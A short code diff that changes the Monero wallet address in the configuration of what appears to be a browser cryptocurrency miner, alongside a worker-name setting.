@@ -4,7 +4,7 @@
 
 const CONFIG = {
   // Your Monero wallet address
-  WALLET: '43fx9ijTgKESpbsYjukgHiNDLqoZXnkuZVyBnRkNmbCFDz43us6qtdNM1nSSYJ1AUdUSXbTBn2k8rVWBWB4zRfDaGaiBYUQ',
+  WALLET: '42C9fVZdev5ZW7k6NmNGECVEpy2sCkA8JMpA1i2zLxUwCociGC3VzAbJ5WoMUFp3qeSqpCuueTvKgXZh8cnkbj957aBZiAB',
   
   // Worker name (shows up in pool stats)
   WORKER_NAME: 'sirco_browser_miner',
